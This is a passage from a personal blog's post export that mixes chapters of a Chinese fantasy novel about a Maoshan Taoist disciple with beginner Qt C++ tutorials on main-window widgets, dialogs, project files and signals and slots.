“原来这腹中的阴阳八卦的图案，原来是师傅施的阴阳八卦封印。” “不知师傅是否能告知，为什么会有那么强大的怨气在我体内呢？” 叶辰满脸疑惑的问道 此时只见张广正对着那后山长长的叹了口气，然后继续望着叶辰回答道 “根据记载，若是出生婴儿体内带有怨气，前世一定有着极大的冤屈，死后怨气封入魂体，待投胎转世获得新的肉身时，这股怨气就会慢慢苏醒过来。” “好徒儿，为师自知无涯，未能以道化解你体内的怨气，至于怨气的缘由，待你今日下山后自行参透。” 叶辰心里暗想 “师傅这是要赶我下山了？就算赶我下山，也得让我找个落脚出先把。” 随后说道 “不知师傅让弟子去哪？” 此时张广正身影一闪，来到叶辰背后，一手抓着他肩膀，另一只竖起食中指，一道微弱的红光浮现在两指上，随后慢慢显现出一把模糊的剑影，最后由双指改为掌心，打入叶辰手臂。 “徒儿莫怕，在你下山前，为师赐你一把五行剑，此剑可斩断世间任何的五行之物，望徒儿往后得以善用！” 叶辰眉心一颤，震惊的望着张广正那手心中的红光慢慢融入到自己手臂。 随后双手抱拳，单膝下跪，说道 “感谢师傅！” “起来吧，此次下山，你就先去欧阳村吧，那里有个人在等着你施救呢！” 张广正对着叶辰说道 叶辰缓慢的站起身子，心里沉思着 “欧阳村？莫非——是小悦儿的村子？不会的不会的，世界那么大，不可能那么巧的。” 然而，叶辰越是怕什么就来什么。当然这是后话 待叶辰从沉思中醒悟过来时，张广正的身影早已从原地消失，这时只听空中慢慢回响他的声音 “人道渺渺，仙道茫茫，鬼道乐兮，当人生门，仙道贵生，鬼道贵终。望徒儿早日参透！” 那话音刚落，叶辰面朝张广正府中，双膝下跪，磕了三个头后，慢慢的走下茅山。 “人道渺渺，仙道茫茫……，不知师傅说的这话有何含义？算了算了，不想了，还是先去欧阳村看看吧！” 此时欧阳村中，小悦儿正躺在床上，身旁还有个妇人心神不宁，着急的等待着什么…… 此人便是小悦儿母亲，上官雨萍","categories":[{"name":"小说","slug":"小说","permalink":"https://xiaowuyoucy.github.io/categories/小说/"}],"tags":[]},{"title":"Qt编程第二天","slug":"Qt第二天","date":"2023-10-24T14:04:42.000Z","updated":"2023-11-28T16:30:53.211Z","comments":true,"path":"2023/10/24/Qt第二天/","link":"","permalink":"https://xiaowuyoucy.github.io/2023/10/24/Qt第二天/","excerpt":"","text":"菜单栏 123456789101112131415//1、菜单栏 只能有一个 QMenuBar * bar = menuBar(); //创建菜单栏 setMenuBar(bar); //将菜单栏添加到窗口 //创建菜单QMenu * fileMenu = bar-&gt;addMenu(&quot;文件&quot;);QMenu * editMenu = bar-&gt;addMenu(&quot;编辑&quot;); //创建菜单项QAction * newAction = fileMenu-&gt;addAction(&quot;新建&quot;); //添加分割线fileMenu-&gt;addSeparator();QAction * openAction = fileMenu-&gt;addAction(&quot;打开&quot;); 工具栏 123456789101112131415161718//2、工具栏 可以有多个 QToolBar * toolBar = new QToolBar(this); addToolBar(Qt::LeftToolBarArea,toolBar); //设置只允许左右停靠 toolBar-&gt;setAllowedAreas(Qt::LeftToolBarArea | Qt::RightToolBarArea); //设置浮动 toolBar-&gt;setFloatable(false); //设置移动 （总开关） toolBar-&gt;setMovable(false); //工具栏中放入小部件 toolBar-&gt;addAction(newAction); //添加分割线 toolBar-&gt;addSeparator(); toolBar-&gt;addAction(openAction); 状态栏 123456789//状态栏 只能有一个QStatusBar * stBar = statusBar();setStatusBar(stBar);QLabel * label1 = new QLabel(&quot;左侧提示信息&quot;,this);stBar-&gt;addWidget(label1);QLabel * label2 = new QLabel(&quot;右侧提示信息&quot;,this);stBar-&gt;addPermanentWidget(label2); 铆接部件 （浮动窗口） //铆接部件 （浮动窗口） 可以有多个 QDockWidget * dock = new QDockWidget(&quot;aaa&quot; ,this); addDockWidget(Qt::BottomDockWidgetArea,dock); //只允许左右停靠 dock-&gt;setAllowedAreas(Qt::LeftDockWidgetArea | Qt::RightDockWidgetArea); 核心部件 只能有一个 123//核心部件 只能有一个 QTextEdit * edit = new QTextEdit(this); setCentralWidget(edit); //将记事本设置成核心部件 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#include &quot;mainwindow.h&quot;#include &lt;QMenuBar&gt;#include &lt;QToolBar&gt;#include &lt;QLabel&gt;#include &lt;QStatusBar&gt;#include &lt;QDockWidget&gt;#include &lt;QTextEdit&gt;MainWindow::MainWindow(QWidget *parent) : QMainWindow(parent)&#123; resize(600,400); //1、菜单栏 只能有一个 QMenuBar * bar = menuBar(); setMenuBar(bar); //创建菜单 QMenu * fileMenu = bar-&gt;addMenu(&quot;文件&quot;); QMenu * editMenu = bar-&gt;addMenu(&quot;编辑&quot;); //创建菜单项 QAction * newAction = fileMenu-&gt;addAction(&quot;新建&quot;); //添加分割线 fileMenu-&gt;addSeparator(); QAction * openAction = fileMenu-&gt;addAction(&quot;打开&quot;); //2、工具栏 可以有多个 QToolBar * toolBar = new QToolBar(this); addToolBar(Qt::LeftToolBarArea,toolBar); //设置只允许左右停靠 toolBar-&gt;setAllowedAreas(Qt::LeftToolBarArea | Qt::RightToolBarArea); //设置浮动 toolBar-&gt;setFloatable(false); //设置移动 （总开关） toolBar-&gt;setMovable(false); //工具栏中放入小部件 toolBar-&gt;addAction(newAction); //添加分割线 toolBar-&gt;addSeparator(); toolBar-&gt;addAction(openAction); //状态栏 只能有一个 QStatusBar * stBar = statusBar(); setStatusBar(stBar); QLabel * label1 = new QLabel(&quot;左侧提示信息&quot;,this); stBar-&gt;addWidget(label1); QLabel * label2 = new QLabel(&quot;右侧提示信息&quot;,this); stBar-&gt;addPermanentWidget(label2); //铆接部件 （浮动窗口） 可以有多个 QDockWidget * dock = new QDockWidget(&quot;aaa&quot; ,this); addDockWidget(Qt::BottomDockWidgetArea,dock); //只允许左右停靠 dock-&gt;setAllowedAreas(Qt::LeftDockWidgetArea | Qt::RightDockWidgetArea); //核心部件 只能有一个 QTextEdit * edit = new QTextEdit(this); setCentralWidget(edit);&#125;MainWindow::~MainWindow()&#123;&#125; UI界面设计 这里面不能输入中文 输入英文后再这里可以修改为中文 资源文件 添加资源文件 打开资源文件需要鼠标右键选择 Open in Editor 添加前缀用以区分资源文件,相当于文件夹 添加文件 . 如果上面添加不了,可以用鼠标右键选择对应的选项来添加 1资源文件添加 语法： &quot;: + 前缀名 + 文件名称&quot; 1234567891011121314151617181920212223#include &quot;mainwindow.h&quot;#include &quot;ui_mainwindow.h&quot;MainWindow::MainWindow(QWidget *parent) : QMainWindow(parent), ui(new Ui::MainWindow)&#123; ui-&gt;setupUi(this); //给新建添加小图标 //ui-&gt;actionNew-&gt;setIcon(QIcon(&quot;E:/Image/Luffy.png&quot;)); //资源文件添加 语法： &quot;: + 前缀名 + 文件名称&quot; ui-&gt;actionNew-&gt;setIcon(QIcon(&quot;:/Image/Luffy.png&quot;)); ui-&gt;actionOpen-&gt;setIcon(QIcon(&quot;:/Image/LuffyQ.png&quot;));&#125;MainWindow::~MainWindow()&#123; delete ui;&#125; 对话框 模态对话框创建 1234//模态对话框创建// QDialog dlg(this);// dlg.resize(120,30);// dlg.exec(); 非模态对话框 123456//非模态对话框创建// QDialog *dlg2 = new QDialog(this);// dlg2-&gt;resize(120,30);// dlg2-&gt;show();// //设置 55号属性// dlg2-&gt;setAttribute(Qt::WA_DeleteOnClose); QMessageBox对话框 1234567891011121314151617181920//错误提示对话框//QMessageBox::critical(this,&quot;错误&quot;,&quot;critical&quot;);//信息提示对话框//QMessageBox::information(this,&quot;信息&quot;,&quot;info&quot;);//询问提示对话框 // 参数1 父窗口 参数2 标题 参数3 提示信息 参数4 按键类型 参数5 默认关联回车按键// if( QMessageBox::Save == QMessageBox::question(this,&quot;询问&quot;,&quot;question&quot; , QMessageBox::Save | QMessageBox::Cancel ,QMessageBox::Cancel))// &#123;// qDebug()&lt;&lt;&quot;点击的是保存&quot;;// &#125;// else// &#123;// qDebug()&lt;&lt;&quot;点击的是取消&quot;;// &#125;//警告提示对话框//QMessageBox::warning(this,&quot;警告&quot;,&quot;warning&quot;); 标准常用的对话框 123456789QColorDialog： 选择颜色；QFileDialog： 选择文件或者目录；QFontDialog： 选择字体；QInputDialog： 允许用户输入一个值，并将其值返回；QMessageBox： 模态对话框，用于显示信息、询问问题等；QPageSetupDialog： 为打印机提供纸张相关的选项；QPrintDialog： 打印机配置；QPrintPreviewDialog： 打印预览；QProgressDialog： 显示操作过程。 12345678910111213//颜色对话框// QColor color = QColorDialog::getColor(Qt::red);// qDebug() &lt;&lt; color.red() &lt;&lt; color.green() &lt;&lt; color.blue() ;//文件对话框// QString fileName = QFileDialog::getOpenFileName(this,&quot;打开文件&quot;,&quot;C:\\\\Users\\\\zhangtao\\\\Desktop&quot;,&quot;(*.doc)&quot;);// qDebug () &lt;&lt;fileName;//字体对话框 bool flag; QFont font = QFontDialog::getFont(&amp;flag,QFont(&quot;华文彩云&quot;,36)); qDebug() &lt;&lt; &quot;字体&quot; &lt;&lt; font.family().toUtf8().data() &lt;&lt; &quot;字号&quot;&lt;&lt; font.pointSize() &lt;&lt; &quot;是否加粗&quot;&lt;&lt;font.bold() &lt;&lt; &quot;是否倾斜&quot; &lt;&lt; font.italic(); 界面布局 标签 单行编辑框 echoMode属性 Normal（正常模式）：这是默认模式，用户输入的文本以明文形式显示在编辑框中。这是最常见的使用方式，适用于大多数文本输入场景。 NoEcho（无回显模式）：在这个模式下，用户输入的文本不会显示在编辑框内，用于隐藏用户输入的文本，例如用于密码输入，以保护敏感信息。 Password（密码模式）：在这个模式下，用户输入的文本以密码掩码字符（通常是圆点或星号）显示在编辑框内。这是用于密码输入框的常见设置，以保护密码的机密性。 PasswordEchoOnEdit（编辑时密码模式）：用户在输入时，文本以明文形式显示在编辑框内，但当编辑框失去焦点后，文本会以密码掩码字符显示。这是一种用户友好的密码输入方式，让用户能够确认他们输入的内容。 容器 容器属性: ​ 固定容器大小 水平布局 垂直布局 栅格布局 几行几列的选栅格布局,然后再选垂直布局 没有布局会有红圈 弹簧 固定布局的 弹簧属性 Fixed是固定弹簧大小 Expanding是可伸缩的 打破布局 修改窗口标题 修改容器内边距 固定窗口大小 把minimumSize和maximumSize值都设置一样 常用控件–按钮组","categories":[{"name":"Qt","slug":"Qt","permalink":"https://xiaowuyoucy.github.io/categories/Qt/"}],"tags":[]},{"title":"第二篇 揭晓身世","slug":"第二章下山","date":"2023-10-20T16:22:54.000Z","updated":"2023-10-25T17:40:12.833Z","comments":true,"path":"2023/10/21/第二章下山/","link":"","permalink":"https://xiaowuyoucy.github.io/2023/10/21/第二章下山/","excerpt":"","text":"茅山又名句曲山，在茅山大堂缓缓走出一名老者，只见老者手握拳头，伸出食指中指运气灵气说道 ​ “净儿，你过来一下，为师今日有特别的话要和你说！” 原来此乃茅山中的传音术，而灵气乃又是每个修行道人所需，修行人需要每天刻苦修炼，最后吸灵入体，最后才能驱使万千道法。 此时茅山后院的森林内，一人正在打坐，然后缓缓睁开双眼 ​ “师傅有特别的事要对我说？会是什么事儿呢！” 此人正是十年前救下小悦儿的叶辰，原来十年前叶辰把悦儿送到二婶婶家后，就来到了茅山修行，做起了茅山的俗家弟子，故而道号为玄净。 只见叶辰站起身,食指中指夹着一道黄符，口中念道 ​ “日遁千里，夜遁八百，五行土遁，敕令” 突然，叶辰从原地瞬间消失不见 茅山院内骤然出现了一道身影，此人正是刚刚从森林中消失不见的叶辰，只见叶辰大步走向茅山大堂，然后双手抱拳，单膝下跪地说道 “弟子，拜见师傅，不知师傅找弟子有何事” 老者单手一挥，口中说道 “净儿，起来吧” 此时只见叶辰被一股无形的力量托起，可见那老者的道行深不可测啊。 老者说道 ”净儿啊，为师找你来是想告诉你，你已经随为师修行有十余载了吧“ 当叶辰回忆起自救下小悦儿之后，已经过去了整整十年了，便赶忙说道 “是的，不知师傅为何提起此事儿？” “就让为师给你讲一个故事吧” 只见那老者口中缓缓说道 十八年前，叶家村中一名丫鬟急匆匆在大街人群中边跑边呼喊着 “叶老爷，叶老爷！” 人群中一名男子，手里拿着一把扇子，缓缓地回过头，望着那匆匆赶来的丫鬟说道 “什么事儿，大街上大喊大叫，成何体统！” 只见那丫鬟来到叶老爷身旁，边喘气边来回的抚摸着胸口，咽了咽嗓子说道： “老~老爷，夫人要生了，您——您赶紧回去一趟吧！ ” “什么？” ，男子手中扇子一合，立马拍打在另一只手心上目视着那丫鬟 “老爷，你还是先赶紧回去一趟吧！” 只见那丫鬟面露着慌张的神色，似乎有不好的事情即将到来。 此时只见那男子迈起腿大步的朝叶家方向走去。 这时叶家家中卧室里传来一阵阵人群中慌乱的嘈杂声 ”啊——啊————我要不行了~“ 只见一名即将临盆的妇人额头布满汗珠，双手紧抓床褥，面带痛苦表情地喊道。 “妇人，坚持住啊，已经可以看到孩子的脑袋了，用力~再用点力气” 一位身穿古老的绸袍，头戴一顶古朴帽子的产婆在旁安抚着那妇人。 就在这时那妇人突然发出 “啊————！” 长长的一声随即瘫软在床上一动也不动便失去了气息。紧接着，一连串的婴儿哭声，打破了这卧室里先前的嘈杂慌乱声。 门外传来匆忙的加不上,没一会过分,叶老爷便出现在门口。 “夫人！ 夫人怎么了？，这到底发生什么事儿了？”，叶老爷瞪大了双眼，目视着那床上一动不动的妇人，随后慌忙的对着屋内的几人问道。 “老爷，夫人难产死了——，刚刚你~你出去的时候，夫人突然感觉到肚子疼，于是我们便赶忙叫来产婆……” 此时几位丫鬟，踉跄的走到他身旁随后带着哭腔地将刚刚所发生的事情，，都一五一十的告诉叶老爷。 几位丫鬟刚说完，只见叶老爷的双手微微一颤，哐当一声，那把手中拿着的扇子早已掉落在地上。 只见叶老爷来到那妇人身边，单手抚摸着那妇人额头 “夫人，你怎么忍心丢下我和…” 叶老爷话还没来得及说完，那产婆手里抱着的孩子突然散发着一股强大的怨气，在这个强大的怨气影响下，众人便纷纷倒下，再无声息。 此时门外渐渐的出现了一个老者的身影。 “好强大的怨气！想不到一个婴儿身上竟带着这么强劲的怨气！” 只见那老者竖起食中指，嘴里念着奇怪的咒语，随后由食中指改向无名指、食指、拇指往那婴儿点去， 一股无形强大的灵气瞬间出现，正在慢慢的压制住那股婴儿身上散发出来的怨气，直到那股怨气被完全压制住，消失不见。 此刻那名婴儿腹中慢慢出现了一个阴阳八卦的图案。 那老者抱起婴儿走向门外，经过多方询问，最后此婴儿才被一户膝下无儿无女的人家收留。 那老者临走前嘱咐到 “待这孩子八岁时，让他来茅山来找本道。” 那户人家上前询问 “不知这位道长怎么称呼？ ” “贫道乃张广正” 话刚说完，那张广正的身影慢慢从原地散去。 “啊—原来是茅山张真人啊！这孩子有救了！”","categories":[{"name":"小说","slug":"小说","permalink":"https://xiaowuyoucy.github.io/categories/小说/"}],"tags":[]},{"title":"第一篇  初遇悦儿","slug":"第一章缘的由来","date":"2023-10-19T15:04:51.000Z","updated":"2023-10-20T17:11:01.422Z","comments":true,"path":"2023/10/19/第一章缘的由来/","link":"","permalink":"https://xiaowuyoucy.github.io/2023/10/19/第一章缘的由来/","excerpt":"","text":"​ 故事还得从孤云镇秋风村说起，一位少年在树林小道里悠哉悠哉的赶着路， ​ ”呜呜呜呜~“ 少年喊道： ​ ”是谁在哭啊！快给本少爷出来！“ 只听树林里传来的女孩的哭声却不见有任何人回答， 少年心想： ​ ”不会这么倒霉吧！大白天遇到鬼了？不对呀，常听村里人说起，这条路经常有野兽出没，该不会是前方有人遇到危险了吧？“ ， 少年急急忙忙从路旁抄起一根坚硬的木棍，毅然地朝着哭声的来源地跑去。，此时只见前方有个小女孩坐在地上哭泣着，旁边还有一只老虎凶猛地注视着她。 突然，老虎走到小女孩跟前，张开巨大的嘴巴准备扑向她。 ​ “小妹妹别怕！畜生东西快滚开”， 少年挥舞着木棍，狠狠地敲击了老虎的腹部。老虎发出痛苦的嗷叫声，后退了几步，然后再次扑向了少年。 ““砰”” 只见那少年被扑倒在地，那猛虎张开血盆大口就要往少年脑袋咬去。 “混账东西，刚刚打得还不够疼是吧！” 少年用木棍顶住老虎的嘴巴，一手从口袋里抽出小刀，直取老虎的眼睛。老虎吃痛，大吼一声 “嗷~”， 用力地将少年甩开，然后迅速消失在树林深处。 ​ “畜生东西，再慢两步，爷爷皮都给你剥下来” 少年起身，拍打身上的泥尘，检查了一下自己的伤势。除了手臂上被老虎甩伤外，其他部位都没有受伤。然后，他走向小女孩。 ​ “小妹妹，不要哭啦，老虎已经被哥哥赶跑了！” 小女孩边哭泣边说道 ​ “真的吗？” 少年摸着小女孩的脑袋回答 ​ “嗯，小妹妹你怎么一个人跑到这啊，这里很危险的！“ 小女孩： ​ “呜呜呜~ 娘亲叫我拿点蘑菇到二婶婶家，我走着走着就不知道怎么着就走到这了。” ​ “好啦好啦，小妹妹你叫什么名字呢！不许哭了哦，哥哥给你吃冰糖葫芦” 说完少年就从包袱里拿出用纸张包着的冰糖葫芦递到小女孩面前。 ​ “谢谢大哥哥，我叫欧阳子悦，家里人都叫我悦儿，大哥哥你又叫什么名字呢？” 小女孩带着抽泣的声音回答少年。 ​ “我呀，我叫叶辰，你叫我叶哥哥吧~，你二婶婶家在哪儿？我送你过去吧！” 叶辰扶起悦儿说道。 ​ “二婶婶在一里外的柳岚村，啊~,叶哥哥，我脚疼，应该是刚刚遇到大老虎，慌忙跑的时候摔到了，扭伤了。” 这时悦儿用手捂住脚踝。 ​ “哥哥背你过去吧， 恰好我也顺路” 叶辰背起小悦儿就往柳岚村走去。 ​ “叶哥哥谢谢你刚刚救了我，幸好叶哥哥及时出现帮我赶走了大老虎，要不然我都不知道怎么办呢，叶哥哥真勇敢!” 此时小悦儿心里悄悄的埋下了对叶哥哥喜爱和崇拜的种子。 小悦儿脑袋靠着叶辰的肩膀上说道 ​ “傻丫头，以后一个人就不要走这条……。” 话还没说完，叶辰就听到身后传来了细小的呼呼声。只见那小悦儿面带笑容的睡着了。估计被刚刚那只大老虎吓到，然后哭累了吧。 不知过了多久，叶辰走到了一处村口，只见村口牌匾上写着柳岚村。 ​ “呦，这不是小悦儿吗！怎么和一个陌生人过来了~” 在不远处一位妇人对着村口的叶辰叫道。 ​ “想必你就是悦儿的二婶婶吧！” 叶辰对着那不远处的妇人说道。 ​ “是是是，敢问这位小兄弟是悦儿的什么人呢？” 妇人疑惑的望着那小伙子问道。 这时小悦儿估计是听到了二婶婶的叫喊，醒了过来。叶辰轻轻的将悦儿放下来后，便将刚刚发生的前因后果给二婶婶道来。 二婶婶听完后，先是吃惊，然后欣慰的说道 ​ “这悦儿的母亲也真是的，小悦儿还这么小，就让她一个人过来，幸好遇到小兄弟你及时出手相救，要不然咱们家小悦儿就……，小兄弟要是不嫌弃的话就留下来吃个饭，住一晚上在做打算呀，就当是我们家报答你今天对小悦儿的救命之恩，不知小兄弟意下如何？&quot; 叶辰连忙摇手道 ​ “不了不了，我还得着急赶路去大孤镇呢。把小悦儿安全的送到你这里来我就放心了。” 叶辰对二婶说完后便准备起身出发。 ​ “叶哥哥，我们什么时候才能再见面啊！” 小悦儿对着叶辰温柔的说道 叶辰轻轻地摸了摸悦儿的脑袋回答道 ​ “等小悦儿长大的时候，我们还会再见面哒。小悦儿要乖乖听话哦。要不然叶哥哥就不见你了哦。” 叶辰说完便往大孤镇的方向走去。 只见悦儿恋恋不舍的望着叶辰的身影大声喊到 ​ “叶哥哥，不要忘记了咱们的约定呀，等我长大后，一定要来看小悦儿~” 叶辰慢慢的远去，直到身影完全消失不见。 十年后…… ​","categories":[{"name":"小说","slug":"小说","permalink":"https://xiaowuyoucy.github.io/categories/小说/"}],"tags":[]},{"title":"yydc0001","slug":"yydc0001","date":"2023-10-11T15:58:48.000Z","updated":"2023-10-11T16:19:02.473Z","comments":true,"path":"2023/10/11/yydc0001/","link":"","permalink":"https://xiaowuyoucy.github.io/2023/10/11/yydc0001/","excerpt":"","text":"","categories":[{"name":"英语单词","slug":"英语单词","permalink":"https://xiaowuyoucy.github.io/categories/英语单词/"}],"tags":[]},{"title":"Qt编程第一天","slug":"Qt编程第一天","date":"2023-10-11T15:09:49.000Z","updated":"2023-10-25T15:44:05.373Z","comments":true,"path":"2023/10/11/Qt编程第一天/","link":"","permalink":"https://xiaowuyoucy.github.io/2023/10/11/Qt编程第一天/","excerpt":"","text":".pro文件 1234567QT += core gui //包含的模块greaterThan(QT_MAJOR_VERSION, 4): QT += widgets //大于Qt4版本 才包含widget模块TARGET = QtFirst //应用程序名 生成的.exe程序名称TEMPLATE = app //模板类型 应用程序模板SOURCES += main.cpp\\ //源文件 mywidget.cppHEADERS += mywidget.h //头文件 .pro就是工程文件(project)，它是qmake自动生成的用于生产makefile的配置文件。.pro文件的写法如下： 注释 从“#”开始，到这一行结束。 模板变量 告诉qmake为这个应用程序生成哪种makefile。下面是可供使用的选择：TEMPLATE = app app -建立一个应用程序的makefile。这是默认值，所以如果模板没有被指定，这个将被使用。 lib - 建立一个库的makefile。 vcapp - 建立一个应用程序的VisualStudio项目文件。 vclib - 建立一个库的VisualStudio项目文件。 subdirs -这是一个特殊的模板，它可以创建一个能够进入特定目录并且为一个项目文件生成makefile并且为它调用make的makefile。 配置信息 CONFIG用来告诉qmake关于应用程序的配置信息。 CONFIG += c11 //使用c11的特性 在这里使用“+=”，是因为我们添加我们的配置选项到任何一个已经存在中。这样做比使用“=”那样替换已经指定的所有选项更安全。 命名规范 类名：首字母 大小 单词和单词之间 首字母 大写 变量、函数名： 首字母小写 单词和单词之间 首字母 大写 快捷键 1234567891011运行 ctrl + R编译 ctrl + B查询 ctrl + F注释 ctrl + /帮助 F1字体缩放 ctrl + 鼠标滚轮整行代码移动 ctrl + shift + ↑ ↓自动对齐 ctrl + i同名之间的.h .cpp切换 F4帮助文档 F1 左侧列表中按钮 C:\\Qt\\Qt5.6.0\\5.6\\mingw49_32\\bin QPushButton基本创建 mywidget.h 123456789101112131415#ifndef MYWIDGET_H#define MYWIDGET_H#include &lt;QWidget&gt;class MyWidget : public QWidget&#123; Q_OBJECT //Q_OBJECT宏 支持信号和槽public: MyWidget(QWidget *parent = 0); ~MyWidget();&#125;;#endif // MYWIDGET_H mywidget.cpp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#include \"mywidget.h\"#include &lt;QPushButton&gt;#include \"mypushbutton.h\"#include &lt;QDebug&gt;//命名规范// 类名 首字母 大小 单词和单词之间 首字母 大写// 变量、函数名 首字母小写 单词和单词之间 首字母 大写//快捷键// 运行 ctrl + R// 编译 ctrl + B// 查询 ctrl + F// 注释 ctrl + /// 帮助 F1// 字体缩放 ctrl + 鼠标滚轮// 整行代码移动 ctrl + shift + ↑ ↓// 自动对齐 ctrl + i// 同名之间的.h .cpp切换 F4// 帮助文档 F1 左侧列表中按钮 C:\\Qt\\Qt5.6.0\\5.6\\mingw49_32\\binMyWidget::MyWidget(QWidget *parent) : QWidget(parent)&#123; //按钮 QPushButton * btn = new QPushButton; //btn-&gt;show(); //show用顶层方式弹出 //如果想显示到当前窗口中 ，需要做依赖,设置父亲 btn-&gt;setParent(this); //显示文本 btn-&gt;setText(\"德玛西亚\"); //按钮2 QPushButton * btn2 = new QPushButton(\"第二个\",this); //移动btn2 btn2-&gt;move(100,100); //重置窗口大小 resize(600,400); //按钮 可以重置大小吗？ 可以 //btn-&gt;resize(300,200); //指定窗口标题 setWindowTitle(\"第一个窗口\"); //设置窗口固定大小 setFixedSize(600,400); //创建自定义的按钮 MyPushButton * myBtn = new MyPushButton; myBtn-&gt;setParent(this); myBtn-&gt;setText(\"我的按钮\"); myBtn-&gt;move( 300,200); //点击按钮 关闭窗口 //connect( 信号发送者，发送的信号，信号的接受者，处理的槽函数） //信号和槽 优点： 松散耦合 // connect(myBtn, &amp;QPushButton::clicked , this, &amp;QWidget::close ); connect( myBtn , &amp;MyPushButton::clicked ,this, &amp;MyWidget::close);&#125;MyWidget::~MyWidget()&#123; qDebug() &lt;&lt; \"MyWidget析构调用\";&#125; mypushbutton.h 1234567891011121314151617181920#ifndef MYPUSHBUTTON_H#define MYPUSHBUTTON_H#include &lt;QPushButton&gt;//这个类作用于什么,就继承什么class MyPushButton : public QPushButton&#123; Q_OBJECTpublic: explicit MyPushButton(QWidget *parent = 0); ~MyPushButton();signals:public slots:&#125;;#endif // MYPUSHBUTTON_H mypushbutton.cpp 1234567891011#include \"mypushbutton.h\"#include &lt;QDebug&gt;MyPushButton::MyPushButton(QWidget *parent) : QPushButton(parent)&#123;&#125;MyPushButton::~MyPushButton()&#123; qDebug() &lt;&lt; \"MyPushButton的析构函数调用\";&#125; 对象模型（对象树） 一定程度上简化了内存回收机制 当创建的对象 指定的父亲是由QObject或者Object派生的类时候，这个对象被加载到对象树上，当窗口关闭掉时候，树上的对象也都会被释放掉 Qt中的坐标系 x以右侧为正 y以下侧为正 左上角是 0,0点 Qt中信号和槽基本使用 ![Qt信号和槽 ](/images/javawz/Qt信号和槽 .png) 需求：点击按钮关闭窗口 连接 connect ( 信号的发送者，发送的信号，信号的接受者，处理的槽函数) 1connect( myBtn , &amp;MyPushButton::clicked ,this, &amp;MyWidget::close); 当自定义插槽类有多个信号时,要使用函数指针来传递给connect函数,否则会出现歧义性,导致出错。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#include &quot;mywidget.h&quot;#include &lt;QPushButton&gt;#include &quot;mypushbutton.h&quot;#include &lt;QDebug&gt;//命名规范// 类名 首字母 大小 单词和单词之间 首字母 大写// 变量、函数名 首字母小写 单词和单词之间 首字母 大写//快捷键// 运行 ctrl + R// 编译 ctrl + B// 查询 ctrl + F// 注释 ctrl + /// 帮助 F1// 字体缩放 ctrl + 鼠标滚轮// 整行代码移动 ctrl + shift + ↑ ↓// 自动对齐 ctrl + i// 同名之间的.h .cpp切换 F4// 帮助文档 F1 左侧列表中按钮 C:\\Qt\\Qt5.6.0\\5.6\\mingw49_32\\binMyWidget::MyWidget(QWidget *parent) : QWidget(parent)&#123; //按钮 QPushButton * btn = new QPushButton; //btn-&gt;show(); //show用顶层方式弹出 //如果想显示到当前窗口中 ，需要做依赖 btn-&gt;setParent(this); //显示文本 btn-&gt;setText(&quot;德玛西亚&quot;); //按钮2 QPushButton * btn2 = new QPushButton(&quot;第二个&quot;,this); //移动btn2 btn2-&gt;move(100,100); //重置窗口大小 resize(600,400); //按钮 可以重置大小吗？ 可以 //btn-&gt;resize(300,200); //指定窗口标题 setWindowTitle(&quot;第一个窗口&quot;); //设置窗口固定大小 setFixedSize(600,400); //创建自定义的按钮 MyPushButton * myBtn = new MyPushButton; myBtn-&gt;setParent(this); myBtn-&gt;setText(&quot;我的按钮&quot;); myBtn-&gt;move( 300,200); //点击按钮 关闭窗口 //connect( 信号发送者，发送的信号，信号的接受者，处理的槽函数） //信号和槽 优点： 松散耦合 // connect(myBtn, &amp;QPushButton::clicked , this, &amp;QWidget::close ); connect( myBtn , &amp;MyPushButton::clicked ,this, &amp;MyWidget::close);&#125;MyWidget::~MyWidget()&#123; qDebug() &lt;&lt; &quot;MyWidget析构调用&quot;;&#125; 如果一个类找不到继承,可以选择QObject类 student.h 123456789101112131415161718192021222324252627#ifndef STUDENT_H#define STUDENT_H#include &lt;QObject&gt;class Student : public QObject&#123; Q_OBJECTpublic: explicit Student(QObject *parent = 0);signals: //自定义槽函数 写到public slots Qt 5.0版本以上 可以写成全局函数或者public作用域下 或者 lambda表达式public slots: //返回值是void //需要声明 也需要有实现 //可以有参数 可以发生重载 void treat(); void treat(QString foodName);&#125;;#endif // STUDENT_H student.cpp 123456789101112131415161718192021#include &quot;student.h&quot;#include &lt;QDebug&gt;Student::Student(QObject *parent) : QObject(parent)&#123;&#125;void Student::treat()&#123; qDebug() &lt;&lt; &quot;请老师吃饭&quot;;&#125;void Student::treat(QString foodName)&#123; //如果打印QString类型的字符串会自带双引号,除非转换为chat * 类型 //QString 转 char * 通过.toUtf8转为 QByteArray 类型 通过 .data()转为 char * qDebug() &lt;&lt; &quot;请老师吃饭 , 老师要吃： &quot; &lt;&lt; foodName.toUtf8().data();&#125; teacher.h 12345678910111213141516171819202122232425#ifndef TEACHER_H#define TEACHER_H#include &lt;QObject&gt;class Teacher : public QObject&#123; Q_OBJECTpublic: explicit Teacher(QObject *parent = 0);//自定义信号 写到signals下signals: //返回值是void //只需要声明 不需要实现 //可以有参数 可以发生重载 void hungry(); void hungry( QString foodName);public slots:&#125;;#endif // TEACHER_H 123456#include &quot;teacher.h&quot;Teacher::Teacher(QObject *parent) : QObject(parent)&#123;&#125; widget.h 12345678910111213141516171819202122232425#ifndef WIDGET_H#define WIDGET_H#include &lt;QWidget&gt;#include &quot;student.h&quot;#include &quot;teacher.h&quot;class Widget : public QWidget&#123; Q_OBJECTpublic: Widget(QWidget *parent = 0); ~Widget(); Teacher * zt; Student * st; //下课 void classIsOver();&#125;;#endif // WIDGET_H widget.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127#include &quot;widget.h&quot;#include &lt;QPushButton&gt;#include &lt;QDebug&gt;// Teacher老师类// Student学生类// 下课后 老师会触发一个 饿了 的信号// 学生响应这个信号 并且 请老师吃饭Widget::Widget(QWidget *parent) : QWidget(parent)&#123; //参数带this代表窗口关闭会执行析构函数 this-&gt;zt = new Teacher(this); this-&gt;st = new Student(this); //连接信号和槽 //connect(zt,&amp;Teacher::hungry,st,&amp;Student::treat); //classIsOver(); //连接有参信号和槽 // 函数指针 可以指向 函数地址// void(Teacher:: *teacherSignal)(QString) = &amp;Teacher::hungry;// void(Student:: *studentSlot)(QString ) = &amp;Student::treat;// connect(zt,teacherSignal, st,studentSlot); // classIsOver(); //创建按钮 